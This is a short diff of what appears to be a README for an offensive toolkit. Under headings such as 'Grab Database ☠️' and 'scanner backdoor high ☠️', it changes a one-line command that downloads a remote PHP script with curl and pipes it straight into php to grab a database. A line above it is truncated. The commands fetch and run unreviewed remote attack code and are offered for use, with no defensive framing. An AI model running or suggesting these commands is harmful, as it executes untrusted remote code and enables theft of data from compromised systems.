@@ -20,7 +20,7 @@ curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/auto
 ```
 # Grab Database ☠️
 ```
-curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/grabdb.php | php
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/grabdba.php | php
 ```
 # scanner backdoor high ☠️
 ```
